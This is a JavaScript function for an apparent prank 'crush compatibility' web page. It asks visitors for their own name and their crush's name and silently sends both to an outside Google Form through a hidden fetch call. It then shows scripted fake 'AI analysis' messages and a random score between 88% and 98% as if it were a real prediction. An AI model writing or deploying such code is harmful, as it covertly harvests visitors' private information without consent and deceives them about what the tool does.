function analyze() {
  const userName = document.getElementById("user").value.trim();
  const crushName = document.getElementById("crush").value.trim();

  if (!userName || !crushName) {
    alert("Please enter both names");
    return;
  }

  // 🔹 SEND DATA TO GOOGLE FORM
  const formURL =
    "https://docs.google.com/forms/d/e/1FAIpQLSeOvd4ebbOYn3NCOzm5JhU54PITFg58BLJm7mnai69XRNyNyA/formResponse" +
    "?entry.1315449122=" + encodeURIComponent(userName) +
    "&entry.1816160233=" + encodeURIComponent(crushName);

  fetch(formURL, { mode: "no-cors" });

  // 🔹 UI TRANSITION
  document.getElementById("form").style.display = "none";
  document.getElementById("loading").style.display = "block";

  const aiMessages = [
    "Initializing neural attraction model...",
    "Scanning emotional compatibility vectors...",
    "Analyzing subconscious signals...",
    "Cross-referencing romantic probability matrix...",
    "Finalizing prediction..."
  ];

  let index = 0;
  const aiText = document.getElementById("aiText");

  const interval = setInterval(() => {
    aiText.innerText = aiMessages[index % aiMessages.length];
    index++;
  }, 900);

  // 🔹 SHOW RESULT AFTER DELAY
  setTimeout(() => {
    clearInterval(interval);

    document.getElementById("loading").style.display = "none";
    document.getElementById("result").style.display = "block";

    const score = Math.floor(Math.random() * 11) + 88;
    document.querySelector(".score").innerText =
      score + "% ❤️";
  }, 4500);
}
